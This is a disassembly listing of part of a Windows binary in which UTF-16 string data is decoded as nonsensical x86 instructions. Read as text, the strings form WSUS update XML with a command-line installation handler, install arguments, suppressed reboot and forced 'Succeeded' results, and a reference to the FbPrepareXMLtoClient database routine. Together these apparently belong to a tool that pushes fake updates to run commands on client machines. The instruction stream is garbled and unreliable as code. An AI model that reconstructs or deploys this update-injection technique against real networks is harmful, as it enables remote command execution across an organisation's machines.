  408463:	3d 00 22 00 4e       	cmp    $0x4e002200,%eax
  408468:	00 65 00             	add    %ah,0x0(%ebp)
  40846b:	76 00                	jbe    0x40846d
  40846d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408471:	52                   	push   %edx
  408472:	00 65 00             	add    %ah,0x0(%ebp)
  408475:	62 00                	bound  %eax,(%eax)
  408477:	6f                   	outsl  %ds:(%esi),(%dx)
  408478:	00 6f 00             	add    %ch,0x0(%edi)
  40847b:	74 00                	je     0x40847d
  40847d:	73 00                	jae    0x40847f
  40847f:	22 00                	and    (%eax),%al
  408481:	20 00                	and    %al,(%eax)
  408483:	2f                   	das
  408484:	00 26                	add    %ah,(%esi)
  408486:	00 67 00             	add    %ah,0x0(%edi)
  408489:	74 00                	je     0x40848b
  40848b:	3b 00                	cmp    (%eax),%eax
  40848d:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  408492:	00 3b                	add    %bh,(%ebx)
  408494:	00 2f                	add    %ch,(%edi)
  408496:	00 45 00             	add    %al,0x0(%ebp)
  408499:	78 00                	js     0x40849b
  40849b:	74 00                	je     0x40849d
  40849d:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4084a1:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4084a5:	64 00 50 00          	add    %dl,%fs:0x0(%eax)
  4084a9:	72 00                	jb     0x4084ab
  4084ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4084ac:	00 70 00             	add    %dh,0x0(%eax)
  4084af:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4084b3:	74 00                	je     0x4084b5
  4084b5:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  4084bb:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  4084bf:	74 00                	je     0x4084c1
  4084c1:	3b 00                	cmp    (%eax),%eax
  4084c3:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  4084c8:	00 3b                	add    %bh,(%ebx)
  4084ca:	00 46 00             	add    %al,0x0(%esi)
  4084cd:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  4084d3:	73 00                	jae    0x4084d5
  4084d5:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  4084d9:	74 00                	je     0x4084db
  4084db:	3b 00                	cmp    (%eax),%eax
  4084dd:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  4084e2:	00 3b                	add    %bh,(%ebx)
  4084e4:	00 46 00             	add    %al,0x0(%esi)
  4084e7:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  4084ed:	20 00                	and    %al,(%eax)
  4084ef:	44                   	inc    %esp
  4084f0:	00 69 00             	add    %ch,0x0(%ecx)
  4084f3:	67 00 65 00          	add    %ah,0x0(%di)
  4084f7:	73 00                	jae    0x4084f9
  4084f9:	74 00                	je     0x4084fb
  4084fb:	3d 00 22 00 00       	cmp    $0x2200,%eax
  408500:	7b 54                	jnp    0x408556
  408502:	00 31                	add    %dh,(%ecx)
  408504:	00 35 00 3a 00 32    	add    %dh,0x32003a00
  40850a:	00 36                	add    %dh,(%esi)
  40850c:	00 3a                	add    %bh,(%edx)
  40850e:	00 32                	add    %dh,(%edx)
  408510:	00 30                	add    %dh,(%eax)
  408512:	00 2e                	add    %ch,(%esi)
  408514:	00 37                	add    %dh,(%edi)
  408516:	00 32                	add    %dh,(%edx)
  408518:	00 33                	add    %dh,(%ebx)
  40851a:	00 22                	add    %ah,(%edx)
  40851c:	00 26                	add    %ah,(%esi)
  40851e:	00 67 00             	add    %ah,0x0(%edi)
  408521:	74 00                	je     0x408523
  408523:	3b 00                	cmp    (%eax),%eax
  408525:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40852a:	00 3b                	add    %bh,(%ebx)
  40852c:	00 41 00             	add    %al,0x0(%ecx)
  40852f:	64 00 64 00 69       	add    %ah,%fs:0x69(%eax,%eax,1)
  408534:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  408538:	00 6f 00             	add    %ch,0x0(%edi)
  40853b:	6e                   	outsb  %ds:(%esi),(%dx)
  40853c:	00 61 00             	add    %ah,0x0(%ecx)
  40853f:	6c                   	insb   (%dx),%es:(%edi)
  408540:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  408544:	00 67 00             	add    %ah,0x0(%edi)
  408547:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40854b:	74 00                	je     0x40854d
  40854d:	20 00                	and    %al,(%eax)
  40854f:	41                   	inc    %ecx
  408550:	00 6c 00 67          	add    %ch,0x67(%eax,%eax,1)
  408554:	00 6f 00             	add    %ch,0x0(%edi)
  408557:	72 00                	jb     0x408559
  408559:	69 00 74 00 68 00    	imul   $0x680074,(%eax),%eax
  40855f:	6d                   	insl   (%dx),%es:(%edi)
  408560:	00 3d 00 22 00 53    	add    %bh,0x53002200
  408566:	00 48 00             	add    %cl,0x0(%eax)
  408569:	41                   	inc    %ecx
  40856a:	00 32                	add    %dh,(%edx)
  40856c:	00 35 00 36 00 22    	add    %dh,0x22003600
  408572:	00 26                	add    %ah,(%esi)
  408574:	00 67 00             	add    %ah,0x0(%edi)
  408577:	74 00                	je     0x408579
  408579:	3b 00                	cmp    (%eax),%eax
  40857b:	00 81 21 26 00 6c    	add    %al,0x6c002621(%ecx)
  408581:	00 74 00 3b          	add    %dh,0x3b(%eax,%eax,1)
  408585:	00 2f                	add    %ch,(%edi)
  408587:	00 41 00             	add    %al,0x0(%ecx)
  40858a:	64 00 64 00 69       	add    %ah,%fs:0x69(%eax,%eax,1)
  40858f:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  408593:	00 6f 00             	add    %ch,0x0(%edi)
  408596:	6e                   	outsb  %ds:(%esi),(%dx)
  408597:	00 61 00             	add    %ah,0x0(%ecx)
  40859a:	6c                   	insb   (%dx),%es:(%edi)
  40859b:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  40859f:	00 67 00             	add    %ah,0x0(%edi)
  4085a2:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4085a6:	74 00                	je     0x4085a8
  4085a8:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  4085ac:	74 00                	je     0x4085ae
  4085ae:	3b 00                	cmp    (%eax),%eax
  4085b0:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  4085b5:	00 3b                	add    %bh,(%ebx)
  4085b7:	00 2f                	add    %ch,(%edi)
  4085b9:	00 46 00             	add    %al,0x0(%esi)
  4085bc:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  4085c2:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  4085c6:	74 00                	je     0x4085c8
  4085c8:	3b 00                	cmp    (%eax),%eax
  4085ca:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  4085cf:	00 3b                	add    %bh,(%ebx)
  4085d1:	00 2f                	add    %ch,(%edi)
  4085d3:	00 46 00             	add    %al,0x0(%esi)
  4085d6:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  4085dc:	73 00                	jae    0x4085de
  4085de:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  4085e2:	74 00                	je     0x4085e4
  4085e4:	3b 00                	cmp    (%eax),%eax
  4085e6:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  4085eb:	00 3b                	add    %bh,(%ebx)
  4085ed:	00 48 00             	add    %cl,0x0(%eax)
  4085f0:	61                   	popa
  4085f1:	00 6e 00             	add    %ch,0x0(%esi)
  4085f4:	64 00 6c 00 65       	add    %ch,%fs:0x65(%eax,%eax,1)
  4085f9:	00 72 00             	add    %dh,0x0(%edx)
  4085fc:	53                   	push   %ebx
  4085fd:	00 70 00             	add    %dh,0x0(%eax)
  408600:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  408604:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
  40860a:	63 00                	arpl   %eax,(%eax)
  40860c:	44                   	inc    %esp
  40860d:	00 61 00             	add    %ah,0x0(%ecx)
  408610:	74 00                	je     0x408612
  408612:	61                   	popa
  408613:	00 20                	add    %ah,(%eax)
  408615:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  408619:	00 70 00             	add    %dh,0x0(%eax)
  40861c:	65 00 3d 00 22 00 63 	add    %bh,%gs:0x63002200
  408623:	00 6d 00             	add    %ch,0x0(%ebp)
  408626:	64 00 3a             	add    %bh,%fs:(%edx)
  408629:	00 43 00             	add    %al,0x0(%ebx)
  40862c:	6f                   	outsl  %ds:(%esi),(%dx)
  40862d:	00 6d 00             	add    %ch,0x0(%ebp)
  408630:	6d                   	insl   (%dx),%es:(%edi)
  408631:	00 61 00             	add    %ah,0x0(%ecx)
  408634:	6e                   	outsb  %ds:(%esi),(%dx)
  408635:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  408639:	00 69 00             	add    %ch,0x0(%ecx)
  40863c:	6e                   	outsb  %ds:(%esi),(%dx)
  40863d:	00 65 00             	add    %ah,0x0(%ebp)
  408640:	49                   	dec    %ecx
  408641:	00 6e 00             	add    %ch,0x0(%esi)
  408644:	73 00                	jae    0x408646
  408646:	74 00                	je     0x408648
  408648:	61                   	popa
  408649:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40864d:	00 61 00             	add    %ah,0x0(%ecx)
  408650:	74 00                	je     0x408652
  408652:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  408658:	22 00                	and    (%eax),%al
  40865a:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  40865e:	74 00                	je     0x408660
  408660:	3b 00                	cmp    (%eax),%eax
  408662:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  408667:	00 3b                	add    %bh,(%ebx)
  408669:	00 49 00             	add    %cl,0x0(%ecx)
  40866c:	6e                   	outsb  %ds:(%esi),(%dx)
  40866d:	00 73 00             	add    %dh,0x0(%ebx)
  408670:	74 00                	je     0x408672
  408672:	61                   	popa
  408673:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  408677:	00 43 00             	add    %al,0x0(%ebx)
  40867a:	6f                   	outsl  %ds:(%esi),(%dx)
  40867b:	00 6d 00             	add    %ch,0x0(%ebp)
  40867e:	6d                   	insl   (%dx),%es:(%edi)
  40867f:	00 61 00             	add    %ah,0x0(%ecx)
  408682:	6e                   	outsb  %ds:(%esi),(%dx)
  408683:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  408687:	00 41 00             	add    %al,0x0(%ecx)
  40868a:	72 00                	jb     0x40868c
  40868c:	67 00 75 00          	add    %dh,0x0(%di)
  408690:	6d                   	insl   (%dx),%es:(%edi)
  408691:	00 65 00             	add    %ah,0x0(%ebp)
  408694:	6e                   	outsb  %ds:(%esi),(%dx)
  408695:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  408699:	00 3d 00 22 00 00    	add    %bh,0x2200
  40869f:	81 61 22 00 20 00 52 	andl   $0x52002000,0x22(%ecx)
  4086a6:	00 65 00             	add    %ah,0x0(%ebp)
  4086a9:	62 00                	bound  %eax,(%eax)
  4086ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4086ac:	00 6f 00             	add    %ch,0x0(%edi)
  4086af:	74 00                	je     0x4086b1
  4086b1:	42                   	inc    %edx
  4086b2:	00 79 00             	add    %bh,0x0(%ecx)
  4086b5:	44                   	inc    %esp
  4086b6:	00 65 00             	add    %ah,0x0(%ebp)
  4086b9:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  4086bd:	75 00                	jne    0x4086bf
  4086bf:	6c                   	insb   (%dx),%es:(%edi)
  4086c0:	00 74 00 3d          	add    %dh,0x3d(%eax,%eax,1)
  4086c4:	00 22                	add    %ah,(%edx)
  4086c6:	00 66 00             	add    %ah,0x0(%esi)
  4086c9:	61                   	popa
  4086ca:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  4086ce:	00 65 00             	add    %ah,0x0(%ebp)
  4086d1:	22 00                	and    (%eax),%al
  4086d3:	20 00                	and    %al,(%eax)
  4086d5:	44                   	inc    %esp
  4086d6:	00 65 00             	add    %ah,0x0(%ebp)
  4086d9:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  4086dd:	75 00                	jne    0x4086df
  4086df:	6c                   	insb   (%dx),%es:(%edi)
  4086e0:	00 74 00 52          	add    %dh,0x52(%eax,%eax,1)
  4086e4:	00 65 00             	add    %ah,0x0(%ebp)
  4086e7:	73 00                	jae    0x4086e9
  4086e9:	75 00                	jne    0x4086eb
  4086eb:	6c                   	insb   (%dx),%es:(%edi)
  4086ec:	00 74 00 3d          	add    %dh,0x3d(%eax,%eax,1)
  4086f0:	00 22                	add    %ah,(%edx)
  4086f2:	00 53 00             	add    %dl,0x0(%ebx)
  4086f5:	75 00                	jne    0x4086f7
  4086f7:	63 00                	arpl   %eax,(%eax)
  4086f9:	63 00                	arpl   %eax,(%eax)
  4086fb:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  4086ff:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  408703:	64 00 22             	add    %ah,%fs:(%edx)
  408706:	00 26                	add    %ah,(%esi)
  408708:	00 67 00             	add    %ah,0x0(%edi)
  40870b:	74 00                	je     0x40870d
  40870d:	3b 00                	cmp    (%eax),%eax
  40870f:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  408714:	00 3b                	add    %bh,(%ebx)
  408716:	00 52 00             	add    %dl,0x0(%edx)
  408719:	65 00 74 00 75       	add    %dh,%gs:0x75(%eax,%eax,1)
  40871e:	00 72 00             	add    %dh,0x0(%edx)
  408721:	6e                   	outsb  %ds:(%esi),(%dx)
  408722:	00 43 00             	add    %al,0x0(%ebx)
  408725:	6f                   	outsl  %ds:(%esi),(%dx)
  408726:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40872a:	00 20                	add    %ah,(%eax)
  40872c:	00 52 00             	add    %dl,0x0(%edx)
  40872f:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  408733:	6f                   	outsl  %ds:(%esi),(%dx)
  408734:	00 6f 00             	add    %ch,0x0(%edi)
  408737:	74 00                	je     0x408739
  408739:	3d 00 22 00 66       	cmp    $0x66002200,%eax
  40873e:	00 61 00             	add    %ah,0x0(%ecx)
  408741:	6c                   	insb   (%dx),%es:(%edi)
  408742:	00 73 00             	add    %dh,0x0(%ebx)
  408745:	65 00 22             	add    %ah,%gs:(%edx)
  408748:	00 20                	add    %ah,(%eax)
  40874a:	00 52 00             	add    %dl,0x0(%edx)
  40874d:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  408751:	75 00                	jne    0x408753
  408753:	6c                   	insb   (%dx),%es:(%edi)
  408754:	00 74 00 3d          	add    %dh,0x3d(%eax,%eax,1)
  408758:	00 22                	add    %ah,(%edx)
  40875a:	00 53 00             	add    %dl,0x0(%ebx)
  40875d:	75 00                	jne    0x40875f
  40875f:	63 00                	arpl   %eax,(%eax)
  408761:	63 00                	arpl   %eax,(%eax)
  408763:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  408767:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40876b:	64 00 22             	add    %ah,%fs:(%edx)
  40876e:	00 20                	add    %ah,(%eax)
  408770:	00 43 00             	add    %al,0x0(%ebx)
  408773:	6f                   	outsl  %ds:(%esi),(%dx)
  408774:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  408778:	00 3d 00 22 00 2d    	add    %bh,0x2d002200
  40877e:	00 31                	add    %dh,(%ecx)
  408780:	00 22                	add    %ah,(%edx)
  408782:	00 20                	add    %ah,(%eax)
  408784:	00 2f                	add    %ch,(%edi)
  408786:	00 26                	add    %ah,(%esi)
  408788:	00 67 00             	add    %ah,0x0(%edi)
  40878b:	74 00                	je     0x40878d
  40878d:	3b 00                	cmp    (%eax),%eax
  40878f:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  408794:	00 3b                	add    %bh,(%ebx)
  408796:	00 2f                	add    %ch,(%edi)
  408798:	00 49 00             	add    %cl,0x0(%ecx)
  40879b:	6e                   	outsb  %ds:(%esi),(%dx)
  40879c:	00 73 00             	add    %dh,0x0(%ebx)
  40879f:	74 00                	je     0x4087a1
  4087a1:	61                   	popa
  4087a2:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  4087a6:	00 43 00             	add    %al,0x0(%ebx)
  4087a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4087aa:	00 6d 00             	add    %ch,0x0(%ebp)
  4087ad:	6d                   	insl   (%dx),%es:(%edi)
  4087ae:	00 61 00             	add    %ah,0x0(%ecx)
  4087b1:	6e                   	outsb  %ds:(%esi),(%dx)
  4087b2:	00 64 00 26          	add    %ah,0x26(%eax,%eax,1)
  4087b6:	00 67 00             	add    %ah,0x0(%edi)
  4087b9:	74 00                	je     0x4087bb
  4087bb:	3b 00                	cmp    (%eax),%eax
  4087bd:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  4087c2:	00 3b                	add    %bh,(%ebx)
  4087c4:	00 2f                	add    %ch,(%edi)
  4087c6:	00 48 00             	add    %cl,0x0(%eax)
  4087c9:	61                   	popa
  4087ca:	00 6e 00             	add    %ch,0x0(%esi)
  4087cd:	64 00 6c 00 65       	add    %ch,%fs:0x65(%eax,%eax,1)
  4087d2:	00 72 00             	add    %dh,0x0(%edx)
  4087d5:	53                   	push   %ebx
  4087d6:	00 70 00             	add    %dh,0x0(%eax)
  4087d9:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4087dd:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
  4087e3:	63 00                	arpl   %eax,(%eax)
  4087e5:	44                   	inc    %esp
  4087e6:	00 61 00             	add    %ah,0x0(%ecx)
  4087e9:	74 00                	je     0x4087eb
  4087eb:	61                   	popa
  4087ec:	00 26                	add    %ah,(%esi)
  4087ee:	00 67 00             	add    %ah,0x0(%edi)
  4087f1:	74 00                	je     0x4087f3
  4087f3:	3b 00                	cmp    (%eax),%eax
  4087f5:	27                   	daa
  4087f6:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4087f9:	4e                   	dec    %esi
  4087fa:	00 55 00             	add    %dl,0x0(%ebp)
  4087fd:	4c                   	dec    %esp
  4087fe:	00 4c 00 01          	add    %cl,0x1(%eax,%eax,1)
  408802:	25 50 00 72 00       	and    $0x720050,%eax
  408807:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  40880b:	61                   	popa
  40880c:	00 72 00             	add    %dh,0x0(%edx)
  40880f:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  408813:	4d                   	dec    %ebp
  408814:	00 4c 00 74          	add    %cl,0x74(%eax,%eax,1)
  408818:	00 6f 00             	add    %ch,0x0(%edi)
  40881b:	43                   	inc    %ebx
  40881c:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  408820:	00 65 00             	add    %ah,0x0(%ebp)
  408823:	6e                   	outsb  %ds:(%esi),(%dx)
  408824:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  408828:	51                   	push   %ecx
  408829:	0d 00 0a 00 46       	or     $0x46000a00,%eax
  40882e:	00 75 00             	add    %dh,0x0(%ebp)
  408831:	6e                   	outsb  %ds:(%esi),(%dx)
  408832:	00 63 00             	add    %ah,0x0(%ebx)
  408835:	74 00                	je     0x408837
  408837:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40883d:	20 00                	and    %al,(%eax)
  40883f:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408843:	72 00                	jb     0x408845
  408845:	6f                   	outsl  %ds:(%esi),(%dx)
  408846:	00 72 00             	add    %dh,0x0(%edx)
  408849:	20 00                	and    %al,(%eax)
  40884b:	2d 00 20 00 46       	sub    $0x46002000,%eax
  408850:	00 62 00             	add    %ah,0x0(%edx)
  408853:	50                   	push   %eax
  408854:	00 72 00             	add    %dh,0x0(%edx)
  408857:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  40885b:	61                   	popa
  40885c:	00 72 00             	add    %dh,0x0(%edx)
  40885f:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  408863:	4d                   	dec    %ebp
  408864:	00 4c 00 74          	add    %cl,0x74(%eax,%eax,1)
  408868:	00 6f 00             	add    %ch,0x0(%edi)
  40886b:	43                   	inc    %ebx
  40886c:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  408870:	00 65 00             	add    %ah,0x0(%ebp)
  408873:	6e                   	outsb  %ds:(%esi),(%dx)
  408874:	00 74 00 2e          	add    %dh,0x2e(%eax,%eax,1)
  408878:	00 01                	add    %al,(%ecx)
  40887a:	4f                   	dec    %edi
  40887b:	27                   	daa
  40887c:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40887f:	32 00                	xor    (%eax),%al
  408881:	30 00                	xor    %al,(%eax)
  408883:	34 00                	xor    $0x0,%al
  408885:	2c 00                	sub    $0x0,%al
  408887:	31 00                	xor    %eax,(%eax)
  408889:	2c 00                	sub    $0x0,%al
  40888b:	4e                   	dec    %esi
  40888c:	00 27                	add    %ah,(%edi)
  40888e:	00 26                	add    %ah,(%esi)
  408890:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  408894:	00 3b                	add    %bh,(%ebx)
  408896:	00 55 00             	add    %dl,0x0(%ebp)
  408899:	70 00                	jo     0x40889b
  40889b:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40889f:	74 00                	je     0x4088a1
  4088a1:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  4088a5:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4088a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4088aa:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4088ae:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  4088b2:	00 20                	add    %ah,(%eax)
  4088b4:	00 55 00             	add    %dl,0x0(%ebp)
  4088b7:	70 00                	jo     0x4088b9
  4088b9:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  4088bd:	74 00                	je     0x4088bf
  4088bf:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  4088c3:	44                   	inc    %esp
  4088c4:	00 3d 00 22 00 01    	add    %bh,0x1002200
  4088ca:	82 e1 22             	and    $0x22,%cl
  4088cd:	00 20                	add    %ah,(%eax)
  4088cf:	00 52 00             	add    %dl,0x0(%edx)
  4088d2:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  4088d6:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  4088dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4088dd:	00 6e 00             	add    %ch,0x0(%esi)
  4088e0:	4e                   	dec    %esi
  4088e1:	00 75 00             	add    %dh,0x0(%ebp)
  4088e4:	6d                   	insl   (%dx),%es:(%edi)
  4088e5:	00 62 00             	add    %ah,0x0(%edx)
  4088e8:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4088ec:	3d 00 22 00 32       	cmp    $0x32002200,%eax
  4088f1:	00 30                	add    %dh,(%eax)
  4088f3:	00 34 00             	add    %dh,(%eax,%eax,1)
  4088f6:	22 00                	and    (%eax),%al
  4088f8:	20 00                	and    %al,(%eax)
  4088fa:	2f                   	das
  4088fb:	00 26                	add    %ah,(%esi)
  4088fd:	00 67 00             	add    %ah,0x0(%edi)
  408900:	74 00                	je     0x408902
  408902:	3b 00                	cmp    (%eax),%eax
  408904:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  408909:	00 3b                	add    %bh,(%ebx)
  40890b:	00 50 00             	add    %dl,0x0(%eax)
  40890e:	72 00                	jb     0x408910
  408910:	6f                   	outsl  %ds:(%esi),(%dx)
  408911:	00 70 00             	add    %dh,0x0(%eax)
  408914:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408918:	74 00                	je     0x40891a
  40891a:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  408920:	20 00                	and    %al,(%eax)
  408922:	55                   	push   %ebp
  408923:	00 70 00             	add    %dh,0x0(%eax)
  408926:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40892a:	74 00                	je     0x40892c
  40892c:	65 00 54 00 79       	add    %dl,%gs:0x79(%eax,%eax,1)
  408931:	00 70 00             	add    %dh,0x0(%eax)
  408934:	65 00 3d 00 22 00 53 	add    %bh,%gs:0x53002200
  40893b:	00 6f 00             	add    %ch,0x0(%edi)
  40893e:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  408943:	00 61 00             	add    %ah,0x0(%ecx)
  408946:	72 00                	jb     0x408948
  408948:	65 00 22             	add    %ah,%gs:(%edx)
  40894b:	00 20                	add    %ah,(%eax)
  40894d:	00 45 00             	add    %al,0x0(%ebp)
  408950:	78 00                	js     0x408952
  408952:	70 00                	jo     0x408954
  408954:	6c                   	insb   (%dx),%es:(%edi)
  408955:	00 69 00             	add    %ch,0x0(%ecx)
  408958:	63 00                	arpl   %eax,(%eax)
  40895a:	69 00 74 00 6c 00    	imul   $0x6c0074,(%eax),%eax
  408960:	79 00                	jns    0x408962
  408962:	44                   	inc    %esp
  408963:	00 65 00             	add    %ah,0x0(%ebp)
  408966:	70 00                	jo     0x408968
  408968:	6c                   	insb   (%dx),%es:(%edi)
  408969:	00 6f 00             	add    %ch,0x0(%edi)
  40896c:	79 00                	jns    0x40896e
  40896e:	61                   	popa
  40896f:	00 62 00             	add    %ah,0x0(%edx)
  408972:	6c                   	insb   (%dx),%es:(%edi)
  408973:	00 65 00             	add    %ah,0x0(%ebp)
  408976:	3d 00 22 00 74       	cmp    $0x74002200,%eax
  40897b:	00 72 00             	add    %dh,0x0(%edx)
  40897e:	75 00                	jne    0x408980
  408980:	65 00 22             	add    %ah,%gs:(%edx)
  408983:	00 20                	add    %ah,(%eax)
  408985:	00 41 00             	add    %al,0x0(%ecx)
  408988:	75 00                	jne    0x40898a
  40898a:	74 00                	je     0x40898c
  40898c:	6f                   	outsl  %ds:(%esi),(%dx)
  40898d:	00 53 00             	add    %dl,0x0(%ebx)
  408990:	65 00 6c 00 65       	add    %ch,%gs:0x65(%eax,%eax,1)
  408995:	00 63 00             	add    %ah,0x0(%ebx)
  408998:	74 00                	je     0x40899a
  40899a:	4f                   	dec    %edi
  40899b:	00 6e 00             	add    %ch,0x0(%esi)
  40899e:	57                   	push   %edi
  40899f:	00 65 00             	add    %ah,0x0(%ebp)
  4089a2:	62 00                	bound  %eax,(%eax)
  4089a4:	53                   	push   %ebx
  4089a5:	00 69 00             	add    %ch,0x0(%ecx)
  4089a8:	74 00                	je     0x4089aa
  4089aa:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4089ae:	3d 00 22 00 74       	cmp    $0x74002200,%eax
  4089b3:	00 72 00             	add    %dh,0x0(%edx)
  4089b6:	75 00                	jne    0x4089b8
  4089b8:	65 00 22             	add    %ah,%gs:(%edx)
  4089bb:	00 20                	add    %ah,(%eax)
  4089bd:	00 2f                	add    %ch,(%edi)
  4089bf:	00 26                	add    %ah,(%esi)
  4089c1:	00 67 00             	add    %ah,0x0(%edi)
  4089c4:	74 00                	je     0x4089c6
  4089c6:	3b 00                	cmp    (%eax),%eax
  4089c8:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  4089cd:	00 3b                	add    %bh,(%ebx)
  4089cf:	00 52 00             	add    %dl,0x0(%edx)
  4089d2:	65 00 6c 00 61       	add    %ch,%gs:0x61(%eax,%eax,1)
  4089d7:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4089db:	00 6f 00             	add    %ch,0x0(%edi)
  4089de:	6e                   	outsb  %ds:(%esi),(%dx)
  4089df:	00 73 00             	add    %dh,0x0(%ebx)
  4089e2:	68 00 69 00 70       	push   $0x70006900
  4089e7:	00 73 00             	add    %dh,0x0(%ebx)
  4089ea:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  4089ee:	74 00                	je     0x4089f0
  4089f0:	3b 00                	cmp    (%eax),%eax
  4089f2:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  4089f7:	00 3b                	add    %bh,(%ebx)
  4089f9:	00 50 00             	add    %dl,0x0(%eax)
  4089fc:	72 00                	jb     0x4089fe
  4089fe:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408a02:	65 00 71 00          	add    %dh,%gs:0x0(%ecx)
  408a06:	75 00                	jne    0x408a08
  408a08:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  408a0e:	74 00                	je     0x408a10
  408a10:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  408a14:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  408a18:	74 00                	je     0x408a1a
  408a1a:	3b 00                	cmp    (%eax),%eax
  408a1c:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  408a21:	00 3b                	add    %bh,(%ebx)
  408a23:	00 41 00             	add    %al,0x0(%ecx)
  408a26:	74 00                	je     0x408a28
  408a28:	4c                   	dec    %esp
  408a29:	00 65 00             	add    %ah,0x0(%ebp)
  408a2c:	61                   	popa
  408a2d:	00 73 00             	add    %dh,0x0(%ebx)
  408a30:	74 00                	je     0x408a32
  408a32:	4f                   	dec    %edi
  408a33:	00 6e 00             	add    %ch,0x0(%esi)
  408a36:	65 00 20             	add    %ah,%gs:(%eax)
  408a39:	00 49 00             	add    %cl,0x0(%ecx)
  408a3c:	73 00                	jae    0x408a3e
  408a3e:	43                   	inc    %ebx
